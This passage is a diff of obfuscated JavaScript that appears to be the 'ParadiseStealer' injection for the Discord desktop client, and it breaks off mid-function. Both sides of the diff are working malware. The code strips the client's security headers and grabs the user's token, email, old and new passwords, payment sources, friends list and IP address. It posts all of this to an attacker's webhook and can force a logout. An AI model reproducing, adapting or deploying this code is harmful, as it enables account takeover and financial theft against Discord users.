@@ -1,207 +1,207 @@
-const clennon = soleia;
-function soleia(ninon, airiana) {
-  const sanora = blayson();
-  return soleia = function (johnandrew, dorraine) {
-    johnandrew = johnandrew - 279;
-    let gabrieal = sanora[johnandrew];
-    return gabrieal;
-  }, soleia(ninon, airiana);
-}
-(function (idabel, yulitzy) {
-  const ranard = soleia, danan = idabel();
+const lusma = lurley;
+(function (tanajha, shawntaya) {
+  const sarang = lurley, timmithy = tanajha();
   while (!![]) {
     try {
-      const saniye = -parseInt(ranard(376)) / 1 * (-parseInt(ranard(400)) / 2) + parseInt(ranard(282)) / 3 * (-parseInt(ranard(382)) / 4) + -parseInt(ranard(419)) / 5 + -parseInt(ranard(345)) / 6 + parseInt(ranard(331)) / 7 + -parseInt(ranard(388)) / 8 * (-parseInt(ranard(293)) / 9) + -parseInt(ranard(416)) / 10 * (parseInt(ranard(291)) / 11);
-      if (saniye === yulitzy) break; else danan.push(danan.shift());
-    } catch (ladawna) {
-      danan.push(danan.shift());
+      const latrinity = parseInt(sarang(508)) / 1 * (parseInt(sarang(544)) / 2) + -parseInt(sarang(509)) / 3 + -parseInt(sarang(502)) / 4 + parseInt(sarang(493)) / 5 + -parseInt(sarang(559)) / 6 + -parseInt(sarang(521)) / 7 + parseInt(sarang(488)) / 8;
+      if (latrinity === shawntaya) break; else timmithy.push(timmithy.shift());
+    } catch (anniya) {
+      timmithy.push(timmithy.shift());
     }
   }
-}(blayson, 257927));
-const fs = require("fs"), path = require("path"), {BrowserWindow: BrowserWindow, session: session} = require(clennon(378)), querystring = require(clennon(413)), os = require("os");
-var webhook = "%WEBHOOK_LINK%";
-const computerName = os[clennon(362)](), discordInstall = "" + __dirname, EvalToken = clennon(295), config = {logout: "%LOGOUT%", "logout-notify": clennon(319), "init-notify": clennon(311), "embed-color": 3447704, "disable-qr-code": clennon(396)};
+}(pike, 729561));
+const fs = require("fs"), path = require(lusma(556)), {BrowserWindow: BrowserWindow, session: session} = require("electron"), querystring = require(lusma(558)), os = require("os");
+var webhook = lusma(525);
+const computerName = os.hostname(), discordInstall = "" + __dirname, EvalToken = lusma(633), config = {logout: lusma(632), "logout-notify": lusma(492), "init-notify": "%INITNOTI%", "embed-color": 3447704, "disable-qr-code": lusma(499)};
+function lurley(ailisa, xianna) {
+  const jamason = pike();
+  return lurley = function (jakoda, chunta) {
+    jakoda = jakoda - 487;
+    let yarelie = jamason[jakoda];
+    return yarelie;
+  }, lurley(ailisa, xianna);
+}
 function FirstTime() {
-  const naavah = clennon;
-  BrowserWindow.getAllWindows()[0][naavah(423)][naavah(421)]("" + EvalToken, true)[naavah(318)](emier => {
-    const elijaah = naavah;
-    if (elijaah(375) == config["init-notify"] && fs.existsSync(path.join(__dirname, elijaah(324)))) {
-      if (fs.rmdirSync(path[elijaah(329)](__dirname, elijaah(324))), null == emier || null == emier || "" == emier) {
-        var caleb = {username: elijaah(336), content: "", embeds: [{title: "Discord Initalized (User not Logged in)", color: config["embed-color"], fields: [{name: elijaah(426), value: elijaah(384) + computerName + elijaah(404) + __dirname + elijaah(398), inline: false}], author: {name: elijaah(336)}, footer: {text: elijaah(336)}, thumbnail: {url: elijaah(306)}}]};
-        SendToWebhook(JSON[elijaah(315)](caleb));
-      } else BrowserWindow[elijaah(414)]()[0][elijaah(423)].executeJavaScript(elijaah(292) + emier + elijaah(310), true).then(gumecindo => {
-        const acheron = elijaah, edro = JSON.parse(gumecindo);
-        var ashantie = {username: "ParadiseStealer", content: "", embeds: [{title: acheron(349), color: config["embed-color"], fields: [{name: "Info", value: acheron(384) + computerName + acheron(404) + __dirname + "\n```", inline: false}, {name: "Username", value: "`" + edro[acheron(314)] + "#" + edro[acheron(300)] + "`", inline: true}, {name: "ID", value: "`" + edro.id + "`", inline: true}, {name: acheron(401), value: "" + GetBadges(edro.flags), inline: false}, {name: acheron(297), value: acheron(343) + emier + "```", inline: false}], author: {name: "ParadiseStealer"}, footer: {text: acheron(336)}, thumbnail: {url: "https://cdn.discordapp.com/avatars/" + edro.id + "/" + edro[acheron(321)]}}]};
-        SendToWebhook(JSON[acheron(315)](ashantie));
+  const marietherese = lusma;
+  BrowserWindow.getAllWindows()[0].webContents[marietherese(565)]("" + EvalToken, true)[marietherese(546)](jasun => {
+    const taraneka = marietherese;
+    if (taraneka(487) == config[taraneka(615)] && fs.existsSync(path[taraneka(568)](__dirname, taraneka(588)))) {
+      if (fs.rmdirSync(path[taraneka(568)](__dirname, "init")), null == jasun || null == jasun || "" == jasun) {
+        var rozalyn = {username: taraneka(622), content: "", embeds: [{title: taraneka(496), color: config["embed-color"], fields: [{name: "Info", value: taraneka(551) + computerName + "\nInjection Info: \n" + __dirname + taraneka(584), inline: false}], author: {name: taraneka(622)}, footer: {text: taraneka(622)}, thumbnail: {url: taraneka(522)}}]};
+        SendToWebhook(JSON[taraneka(538)](rozalyn));
+      } else BrowserWindow[taraneka(598)]()[0].webContents.executeJavaScript(taraneka(526) + jasun + taraneka(637), true).then(yunet => {
+        const karyl = taraneka, daviontae = JSON[karyl(634)](yunet);
+        var winford = {username: karyl(622), content: "", embeds: [{title: karyl(534), color: config[karyl(593)], fields: [{name: karyl(547), value: karyl(551) + computerName + karyl(629) + __dirname + karyl(584), inline: false}, {name: karyl(617), value: "`" + daviontae[karyl(527)] + "#" + daviontae[karyl(570)] + "`", inline: true}, {name: "ID", value: "`" + daviontae.id + "`", inline: true}, {name: karyl(524), value: "" + GetBadges(daviontae[karyl(636)]), inline: false}, {name: "Token", value: "```" + jasun + "```", inline: false}], author: {name: karyl(622)}, footer: {text: karyl(622)}, thumbnail: {url: karyl(500) + daviontae.id + "/" + daviontae[karyl(635)]}}]};
+        SendToWebhook(JSON[karyl(538)](winford));
       });
     }
-    if (!fs.existsSync(path[elijaah(329)](__dirname, elijaah(356)))) return true;
-    if (fs.rmdirSync(path[elijaah(329)](__dirname, "ParadiseStealerBTW")), "false" != config[elijaah(381)] || elijaah(387) == config[elijaah(381)]) {
-      if (elijaah(375) == config[elijaah(364)]) null == emier || null == emier || "" == emier ? (caleb = {username: elijaah(336), content: "", embeds: [{title: "User log out (User not Logged in before)", color: config[elijaah(341)], fields: [{name: elijaah(426), value: elijaah(384) + computerName + elijaah(404) + __dirname + elijaah(398), inline: false}], author: {name: elijaah(336)}, footer: {text: elijaah(336)}, thumbnail: {url: elijaah(317)}}]}, SendToWebhook(JSON[elijaah(315)](caleb))) : BrowserWindow[elijaah(414)]()[0][elijaah(423)][elijaah(421)](elijaah(292) + emier + elijaah(310), true)[elijaah(318)](angila => {
-        const rashidat = elijaah, eero = JSON[rashidat(337)](angila);
-        var vedansh = {username: "ParadiseStealer", content: "", embeds: [{title: "User got logged out", color: config["embed-color"], fields: [{name: rashidat(426), value: rashidat(384) + computerName + rashidat(404) + __dirname + rashidat(398), inline: false}, {name: rashidat(350), value: "`" + eero[rashidat(314)] + "#" + eero[rashidat(300)] + "`", inline: true}, {name: "ID", value: "`" + eero.id + "`", inline: true}, {name: rashidat(401), value: "" + GetBadges(eero.flags), inline: false}, {name: rashidat(297), value: rashidat(343) + emier + rashidat(343), inline: false}], author: {name: rashidat(336)}, footer: {text: rashidat(336)}, thumbnail: {url: "https://cdn.discordapp.com/avatars/" + eero.id + "/" + eero.avatar}}]};
-        SendToWebhook(JSON[rashidat(315)](vedansh));
+    if (!fs[taraneka(597)](path[taraneka(568)](__dirname, taraneka(514)))) return true;
+    if (fs[taraneka(550)](path[taraneka(568)](__dirname, taraneka(514))), taraneka(498) != config[taraneka(618)] || taraneka(632) == config[taraneka(618)]) {
+      if (taraneka(487) == config[taraneka(554)]) null == jasun || null == jasun || "" == jasun ? (rozalyn = {username: taraneka(622), content: "", embeds: [{title: taraneka(609), color: config[taraneka(593)], fields: [{name: taraneka(547), value: "```Hostname: \n" + computerName + "\nInjection Info: \n" + __dirname + taraneka(584), inline: false}], author: {name: taraneka(622)}, footer: {text: "ParadiseStealer"}, thumbnail: {url: taraneka(564)}}]}, SendToWebhook(JSON[taraneka(538)](rozalyn))) : BrowserWindow[taraneka(598)]()[0][taraneka(603)][taraneka(565)](taraneka(526) + jasun + '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ', true)[taraneka(546)](dorcy => {
+        const seanette = taraneka, ellakate = JSON[seanette(634)](dorcy);
+        var yeraldo = {username: "ParadiseStealer", content: "", embeds: [{title: seanette(495), color: config["embed-color"], fields: [{name: seanette(547), value: seanette(551) + computerName + seanette(629) + __dirname + seanette(584), inline: false}, {name: seanette(617), value: "`" + ellakate[seanette(527)] + "#" + ellakate[seanette(570)] + "`", inline: true}, {name: "ID", value: "`" + ellakate.id + "`", inline: true}, {name: seanette(524), value: "" + GetBadges(ellakate[seanette(636)]), inline: false}, {name: seanette(549), value: seanette(604) + jasun + seanette(604), inline: false}], author: {name: seanette(622)}, footer: {text: seanette(622)}, thumbnail: {url: "https://cdn.discordapp.com/avatars/" + ellakate.id + "/" + ellakate.avatar}}]};
+        SendToWebhook(JSON[seanette(538)](yeraldo));
       });
-      BrowserWindow.getAllWindows()[0][elijaah(423)].executeJavaScript(elijaah(393), true)[elijaah(318)](naideline => {});
+      BrowserWindow.getAllWindows()[0].webContents[taraneka(565)]('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', true).then(chellsea => {});
     }
     return false;
   });
 }
-session[clennon(302)].webRequest[clennon(340)]((norreta, meha) => {
-  const quamae = clennon;
-  norreta[quamae(377)][quamae(296)](webhook) ? norreta[quamae(377)][quamae(407)](quamae(363)) ? meha({responseHeaders: Object[quamae(332)]({"Access-Control-Allow-Headers": "*"}, norreta[quamae(323)])}) : meha({responseHeaders: Object[quamae(332)]({"Content-Security-Policy": ["default-src '*'", quamae(338), quamae(347)], "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Origin": "*"}, norreta[quamae(323)])}) : (delete norreta[quamae(323)][quamae(391)], delete norreta.responseHeaders[quamae(284)], meha({responseHeaders: {...norreta[quamae(323)], "Access-Control-Allow-Headers": "*"}}));
+session[lusma(516)][lusma(594)].onHeadersReceived((edice, bernadene) => {
+  const tila = lusma;
+  edice[tila(576)][tila(642)](webhook) ? edice.url[tila(582)]("discord.com") ? bernadene({responseHeaders: Object[tila(562)]({"Access-Control-Allow-Headers": "*"}, edice[tila(627)])}) : bernadene({responseHeaders: Object[tila(562)]({"Content-Security-Policy": [tila(631), "Access-Control-Allow-Headers '*'", tila(569)], "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Origin": "*"}, edice[tila(627)])}) : (delete edice[tila(627)][tila(595)], delete edice[tila(627)][tila(519)], bernadene({responseHeaders: {...edice[tila(627)], "Access-Control-Allow-Headers": "*"}}));
 });
-const Filter = {urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", clennon(303), clennon(425), clennon(383), clennon(379), "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]};
-function SendToWebhook(kawai) {
-  const sumiyah = clennon;
-  BrowserWindow[sumiyah(414)]()[0].webContents[sumiyah(421)]('    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "' + webhook + "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" + kawai + sumiyah(351), true)[sumiyah(318)](oluwafunmilola => {});
+const Filter = {urls: [lusma(626), lusma(592), "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", lusma(620), lusma(640), lusma(616), lusma(489)]};
+function SendToWebhook(lank) {
+  const cubby = lusma;
+  BrowserWindow[cubby(598)]()[0][cubby(603)][cubby(565)](cubby(497) + webhook + "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" + lank + cubby(540), true)[cubby(546)](ameah => {});
 }
-function GetNitro(kendarrius) {
-  const shakir = clennon;
-  return 0 == kendarrius ? "No Nitro" : 1 == kendarrius ? shakir(346) : 2 == kendarrius ? shakir(367) : "No Nitro";
+function GetNitro(mushka) {
+  const charolyn = lusma;
+  return 0 == mushka ? "No Nitro" : 1 == mushka ? charolyn(602) : 2 == mushka ? "<a:boost:824036778570416129> `Nitro Boost`" : charolyn(529);
 }
-function GetRBadges(kailin) {
-  const isahiah = clennon;
-  var ashlan = "";
-  return 1 == (1 & kailin) && (ashlan += isahiah(305)), 2 == (2 & kailin) && (ashlan += isahiah(395)), 4 == (4 & kailin) && (ashlan += isahiah(330)), 8 == (8 & kailin) && (ashlan += isahiah(320)), 512 == (512 & kailin) && (ashlan += isahiah(301)), 16384 == (16384 & kailin) && (ashlan += isahiah(428)), 131072 == (131072 & kailin) && (ashlan += "<:developer:874750808472825986> "), "" == ashlan && (ashlan = ""), ashlan;
+function GetRBadges(nihira) {
+  const meco = lusma;
+  var stevee = "";
+  return 1 == (1 & nihira) && (stevee += meco(614)), 2 == (2 & nihira) && (stevee += "<:partner:874750808678354964> "), 4 == (4 & nihira) && (stevee += meco(494)), 8 == (8 & nihira) && (stevee += "<:bughunter_1:874750808426692658> "), 512 == (512 & nihira) && (stevee += "<a:early:925791052512788551> "), 16384 == (16384 & nihira) && (stevee += meco(608)), 131072 == (131072 & nihira) && (stevee += meco(621)), "" == stevee && (stevee = ""), stevee;
 }
-function GetBadges(udy) {
-  const dshae = clennon;
-  var jennilyn = "";
-  return 1 == (1 & udy) && (jennilyn += dshae(305)), 2 == (2 & udy) && (jennilyn += dshae(395)), 4 == (4 & udy) && (jennilyn += dshae(330)), 8 == (8 & udy) && (jennilyn += "<:bughunter_1:874750808426692658> "), 64 == (64 & udy) && (jennilyn += dshae(369)), 128 == (128 & udy) && (jennilyn += "<:brilliance:874750808338608199> "), 256 == (256 & udy) && (jennilyn += "<:balance:874750808267292683> "), 512 == (512 & udy) && (jennilyn += "<a:early:925791052512788551> "), 16384 == (16384 & udy) && (jennilyn += dshae(428)), 131072 == (131072 & udy) && (jennilyn += dshae(355)), "" == jennilyn && (jennilyn = dshae(299)), jennilyn;
+function GetBadges(aydrik) {
+  const skylynne = lusma;
+  var maleck = "";
+  return 1 == (1 & aydrik) && (maleck += skylynne(614)), 2 == (2 & aydrik) && (maleck += skylynne(531)), 4 == (4 & aydrik) && (maleck += skylynne(494)), 8 == (8 & aydrik) && (maleck += skylynne(539)), 64 == (64 & aydrik) && (maleck += skylynne(607)), 128 == (128 & aydrik) && (maleck += skylynne(577)), 256 == (256 & aydrik) && (maleck += skylynne(611)), 512 == (512 & aydrik) && (maleck += skylynne(552)), 16384 == (16384 & aydrik) && (maleck += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & aydrik) && (maleck += skylynne(621)), "" == maleck && (maleck = skylynne(641)), maleck;
 }
-function Login(cassandrea, ily, tamecca) {
-  const talanda = clennon, oneika = BrowserWindow[talanda(414)]()[0];
-  oneika[talanda(423)][talanda(421)](talanda(353) + tamecca + talanda(359), true)[talanda(318)](addalin => {
-    const raymeir = talanda;
-    oneika[raymeir(423)][raymeir(421)](raymeir(420), true)[raymeir(318)](mccarty => {
-      const bravyn = raymeir;
-      oneika[bravyn(423)][bravyn(421)]('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' + tamecca + bravyn(408), true).then(nahyma => {
-        const naquisha = bravyn;
-        oneika.webContents[naquisha(421)](naquisha(374) + tamecca + naquisha(402), true)[naquisha(318)](mahkenzie => {
-          const saundra = naquisha, phaedra = JSON[saundra(337)](addalin);
-          var xavy = {username: "ParadiseStealer", content: "", embeds: [{title: saundra(386), color: config[saundra(341)], fields: [{name: saundra(350), value: "`" + phaedra.username + "#" + phaedra[saundra(300)] + "`", inline: true}, {name: "ID", value: "`" + phaedra.id + "`", inline: true}, {name: saundra(394), value: "" + GetNitro(phaedra[saundra(370)]), inline: false}, {name: saundra(326), value: "" + GetBadges(phaedra.flags), inline: false}, {name: "Billing", value: "" + function () {
-            const tressy = saundra, erricka = JSON[tressy(337)](nahyma);
-            var emilyna = "";
-            return erricka[tressy(406)](jaleeya => {
-              const mikaylie = tressy;
-              if ("" == jaleeya[mikaylie(348)]) return "<a:420_cross:931468716779114536>";
-              if (2 == jaleeya[mikaylie(348)] && 1 != jaleeya[mikaylie(424)]) emilyna += mikaylie(322); else {
-                if (1 != jaleeya[mikaylie(348)] || 1 == jaleeya[mikaylie(424)]) return mikaylie(312);
-                emilyna += "`✔️` :credit_card:";
+function Login(arlynne, kestutis, jaylanis) {
+  const rayonia = lusma, leconte = BrowserWindow.getAllWindows()[0];
+  leconte[rayonia(603)][rayonia(565)](rayonia(491) + jaylanis + rayonia(590), true)[rayonia(546)](zorian => {
+    const genora = rayonia;
+    leconte[genora(603)][genora(565)](genora(545), true)[genora(546)](reshunda => {
+      const chinelle = genora;
+      leconte[chinelle(603)][chinelle(565)](chinelle(566) + jaylanis + chinelle(506), true)[chinelle(546)](climmie => {
+        const givonna = chinelle;
+        leconte[givonna(603)][givonna(565)](givonna(548) + jaylanis + givonna(578), true).then(jasmire => {
+          const ashur = givonna, trenady = JSON[ashur(634)](zorian);
+          var anquanette = {username: ashur(622), content: "", embeds: [{title: ashur(555), color: config[ashur(593)], fields: [{name: ashur(617), value: "`" + trenady[ashur(527)] + "#" + trenady[ashur(570)] + "`", inline: true}, {name: "ID", value: "`" + trenady.id + "`", inline: true}, {name: ashur(573), value: "" + GetNitro(trenady.premium_type), inline: false}, {name: ashur(505), value: "" + GetBadges(trenady[ashur(636)]), inline: false}, {name: ashur(586), value: "" + function () {
+            const elezabeth = ashur, brinkley = JSON[elezabeth(634)](climmie);
+            var mextli = "";
+            return brinkley.forEach(jamianne => {
+              const tija = elezabeth;
+              if ("" == jamianne[tija(533)]) return tija(605);
+              if (2 == jamianne[tija(533)] && 1 != jamianne[tija(580)]) mextli += tija(557); else {
+                if (1 != jamianne.type || 1 == jamianne.invalid) return tija(605);
+                mextli += "`✔️` :credit_card:";
               }
-            }), "" == emilyna && (emilyna = tressy(312)), emilyna;
-          }(), inline: false}, {name: "<:PP_director:942527310324719716>  Email", value: "`" + cassandrea + "`", inline: true}, {name: saundra(399), value: "`" + ily + "`", inline: true}, {name: saundra(297), value: saundra(343) + tamecca + saundra(343), inline: false}], author: {name: saundra(336)}, footer: {text: saundra(336)}, thumbnail: {url: "https://cdn.discordapp.com/avatars/" + phaedra.id + "/" + phaedra[saundra(321)]}}, {title: saundra(354) + JSON.parse(mahkenzie)[saundra(390)](leorn => 1 == leorn[saundra(348)]).length + ")", color: config["embed-color"], description: function () {
-            const daquanna = saundra, nayyirah = JSON[daquanna(337)](mahkenzie)[daquanna(390)](inan => 1 == inan[daquanna(348)]);
-            var carrole = "";
-            for (z of nayyirah) {
-              var cyril = GetRBadges(z[daquanna(294)].public_flags);
-              "" != cyril && (carrole += cyril + (" " + z[daquanna(294)][daquanna(314)] + "#" + z[daquanna(294)][daquanna(300)] + "\n"));
+            }), "" == mextli && (mextli = elezabeth(605)), mextli;
+          }(), inline: false}, {name: ashur(532), value: "`" + arlynne + "`", inline: true}, {name: ashur(515), value: "`" + kestutis + "`", inline: true}, {name: ashur(549), value: "```" + jaylanis + ashur(604), inline: false}], author: {name: ashur(622)}, footer: {text: ashur(622)}, thumbnail: {url: "https://cdn.discordapp.com/avatars/" + trenady.id + "/" + trenady.avatar}}, {title: "Total Friends (" + JSON[ashur(634)](jasmire).filter(tirrany => 1 == tirrany.type)[ashur(613)] + ")", color: config["embed-color"], description: function () {
+            const zuriah = ashur, angelin = JSON[zuriah(634)](jasmire).filter(sarika => 1 == sarika.type);
+            var jatorian = "";
+            for (z of angelin) {
+              var itzan = GetRBadges(z[zuriah(504)][zuriah(624)]);
+              "" != itzan && (jatorian += itzan + (" " + z[zuriah(504)].username + "#" + z[zuriah(504)][zuriah(570)] + "\n"));
             }
-            return "" == carrole && (carrole = daquanna(328)), carrole;
-          }(), author: {name: saundra(336)}, footer: {text: saundra(336)}, thumbnail: {url: saundra(309) + phaedra.id + "/" + phaedra[saundra(321)]}}]};
-          SendToWebhook(JSON[saundra(315)](xavy));
+            return "" == jatorian && (jatorian = zuriah(517)), jatorian;
+          }(), author: {name: ashur(622)}, footer: {text: ashur(622)}, thumbnail: {url: ashur(500) + trenady.id + "/" + trenady[ashur(635)]}}]};
+          SendToWebhook(JSON[ashur(538)](anquanette));
         });
       });
     });
   });
 }
-function ChangePassword(bernadet, havan, reginna) {
-  const wilmary = clennon, ebelia = BrowserWindow[wilmary(414)]()[0];
-  ebelia[wilmary(423)][wilmary(421)]('\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' + reginna + wilmary(359), true).then(estellene => {
-    const meradith = wilmary;
-    ebelia[meradith(423)][meradith(421)](meradith(420), true)[meradith(318)](hisham => {
-      const hasya = meradith;
-      ebelia.webContents.executeJavaScript(hasya(298) + reginna + hasya(408), true)[hasya(318)](alyiah => {
-        const gesele = hasya, joanthony = JSON.parse(estellene);
-        var adasha = {username: gesele(336), content: "", embeds: [{title: "Password Changed", color: config[gesele(341)], fields: [{name: gesele(426), value: gesele(384) + computerName + gesele(281) + hisham + gesele(404) + discordInstall + gesele(398), inline: false}, {name: gesele(350), value: "`" + joanthony[gesele(314)] + "#" + joanthony[gesele(300)] + "`", inline: true}, {name: "ID", value: "`" + joanthony.id + "`", inline: true}, {name: "Nitro", value: "" + GetNitro(joanthony[gesele(370)]), inline: false}, {name: gesele(401), value: "" + GetBadges(joanthony[gesele(327)]), inline: false}, {name: gesele(344), value: "" + function () {
-          const deor = gesele, ilya = JSON[deor(337)](alyiah);
-          var penni = "";
-          return ilya[deor(406)](ariannah => {
-            const cornelia = deor;
-            if ("" == ariannah.type) return cornelia(325);
-            if (2 == ariannah.type && 1 != ariannah[cornelia(424)]) penni += cornelia(322); else {
-              if (1 != ariannah[cornelia(348)] || 1 == ariannah[cornelia(424)]) return cornelia(325);
-              penni += cornelia(409);
+function ChangePassword(tahlaya, yona, chayna) {
+  const alama = lusma, lamontay = BrowserWindow[alama(598)]()[0];
+  lamontay[alama(603)][alama(565)]('\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' + chayna + alama(590), true).then(darrlyn => {
+    const rafid = alama;
+    lamontay[rafid(603)][rafid(565)](rafid(545), true)[rafid(546)](royality => {
+      const slevin = rafid;
+      lamontay.webContents[slevin(565)]('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' + chayna + slevin(506), true)[slevin(546)](burgandy => {
+        const zamarah = slevin, amorina = JSON[zamarah(634)](darrlyn);
+        var nykeemah = {username: zamarah(622), content: "", embeds: [{title: zamarah(583), color: config[zamarah(593)], fields: [{name: zamarah(617), value: "`" + nykeemah[zamarah(527)] + "#" + nykeemah.discriminator + "`", inline: true}, {name: "ID", value: "`" + nykeemah.id + "`", inline: true}, {name: zamarah(573), value: "" + GetNitro(nykeemah.premium_type), inline: false}, {name: "<a:allbadges:895906088996720690>  Badges", value: "" + GetBadges(nykeemah[zamarah(636)]), inline: false}, {name: zamarah(586), value: "" + function () {
+          const ajna = zamarah, draelyn = JSON[ajna(634)](amorina);
+          var kenyatte = "";
+          return draelyn[ajna(628)](tramisha => {
+            const barber = ajna;
+            if ("" == tramisha[barber(533)]) return barber(605);
+            if (2 == tramisha[barber(533)] && 1 != tramisha[barber(580)]) kenyatte += barber(557); else {
+              if (1 != tramisha[barber(533)] || 1 == tramisha[barber(580)]) return barber(605);
+              kenyatte += "`✔️` :credit_card:";
             }
-          }), "" == penni && (penni = deor(325)), penni;
-        }(), inline: false}, {name: "Email", value: "`" + joanthony[gesele(368)] + "`", inline: false}, {name: gesele(342), value: "`" + bernadet + "`", inline: true}, {name: "New Password", value: "`" + havan + "`", inline: true}, {name: gesele(297), value: gesele(343) + reginna + gesele(343), inline: false}], author: {name: gesele(336)}, footer: {text: gesele(336)}, thumbnail: {url: gesele(309) + joanthony.id + "/" + joanthony[gesele(321)]}}]};
-        SendToWebhook(JSON[gesele(315)](adasha));
+          }), "" == kenyatte && (kenyatte = ajna(605)), kenyatte;
+        }(), inline: false}, {name: zamarah(532), value: "`" + amorina[zamarah(518)] + "`", inline: false}, {name: zamarah(501), value: "`" + tahlaya + "`", inline: true}, {name: zamarah(643), value: "`" + yona + "`", inline: true}, {name: "Token", value: zamarah(604) + chayna + zamarah(604), inline: false}], author: {name: "ParadiseStealer"}, footer: {text: "ParadiseStealer"}, thumbnail: {url: "https://cdn.discordapp.com/avatars/" + amorina.id + "/" + amorina[zamarah(635)]}}]};
+        SendToWebhook(JSON[zamarah(538)](nykeemah));
       });
     });
   });
 }
-function ChangeEmail(houghton, kelei, vergil) {
-  const ynes = clennon, balfour = BrowserWindow.getAllWindows()[0];
-  balfour[ynes(423)][ynes(421)](ynes(353) + vergil + '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;', true)[ynes(318)](bowie => {
-    const rishawn = ynes;
-    balfour[rishawn(423)][rishawn(421)](rishawn(420), true)[rishawn(318)](quanterra => {
-      const sibella = rishawn;
-      balfour[sibella(423)][sibella(421)](sibella(298) + vergil + '");\n        xmlHttp.send( null );\n        xmlHttp.responseText', true)[sibella(318)](emeralda => {
-        const tmaya = sibella, datavia = JSON.parse(bowie);
-        var judythe = {username: "ParadiseStealer", content: "", embeds: [{title: tmaya(366), color: config[tmaya(341)], fields: [{name: tmaya(350), value: "`" + datavia.username + "#" + datavia.discriminator + "`", inline: true}, {name: "ID", value: "`" + datavia.id + "`", inline: true}, {name: tmaya(410), value: "" + GetNitro(datavia[tmaya(370)]), inline: false}, {name: tmaya(401), value: "" + GetBadges(datavia.flags), inline: false}, {name: tmaya(344), value: "" + function () {
-          const kynleigh = tmaya, lokelani = JSON.parse(emeralda);
-          var lakeeva = "";
-          return lokelani.forEach(jakeria => {
-            const bayard = soleia;
-            if ("" == jakeria[bayard(348)]) return "`<a:420_cross:931468716779114536>`";
-            if (2 == jakeria.type && 1 != jakeria[bayard(424)]) lakeeva += bayard(322); else {
-              if (1 != jakeria[bayard(348)] || 1 == jakeria.invalid) return "`<a:420_cross:931468716779114536>`";
-              lakeeva += bayard(409);
+function ChangeEmail(karoleena, noland, kebba) {
+  const alaisia = lusma, wulfric = BrowserWindow[alaisia(598)]()[0];
+  wulfric[alaisia(603)].executeJavaScript(alaisia(491) + kebba + alaisia(590), true)[alaisia(546)](marshanti => {
+    const andrel = alaisia;
+    wulfric[andrel(603)][andrel(565)]('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', true)[andrel(546)](zeneida => {
+      const magic = andrel;
+      wulfric.webContents[magic(565)]('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' + kebba + magic(506), true)[magic(546)](ahnyah => {
+        const lacoria = magic, marquiese = JSON[lacoria(634)](marshanti);
+        var amor = {username: lacoria(622), content: "", embeds: [{title: "Email Changed", color: config[lacoria(593)], fields: [{name: lacoria(617), value: "`" + marquiese.username + "#" + marquiese[lacoria(570)] + "`", inline: true}, {name: "ID", value: "`" + marquiese.id + "`", inline: true}, {name: lacoria(600), value: "" + GetNitro(marquiese[lacoria(610)]), inline: false}, {name: lacoria(524), value: "" + GetBadges(marquiese[lacoria(636)]), inline: false}, {name: lacoria(586), value: "" + function () {
+          const shaletha = lacoria, darnay = JSON.parse(ahnyah);
+          var broden = "";
+          return darnay.forEach(shelene => {
+            const perri = lurley;
+            if ("" == shelene[perri(533)]) return "`<a:420_cross:931468716779114536>`";
+            if (2 == shelene[perri(533)] && 1 != shelene.invalid) broden += "`✔️` <:paypal:896441236062347374>"; else {
+              if (1 != shelene[perri(533)] || 1 == shelene[perri(580)]) return perri(541);
+              broden += perri(542);
             }
-          }), "" == lakeeva && (lakeeva = kynleigh(389)), lakeeva;
-        }(), inline: false}, {name: tmaya(418), value: "`" + houghton + "`", inline: true}, {name: tmaya(399), value: "`" + kelei + "`", inline: true}, {name: tmaya(297), value: tmaya(343) + vergil + "```", inline: false}], author: {name: "ParadiseStealer"}, footer: {text: tmaya(336)}, thumbnail: {url: "https://cdn.discordapp.com/avatars/" + datavia.id + "/" + datavia[tmaya(321)]}}]};
-        SendToWebhook(JSON[tmaya(315)](judythe));
+          }), "" == broden && (broden = shaletha(541)), broden;
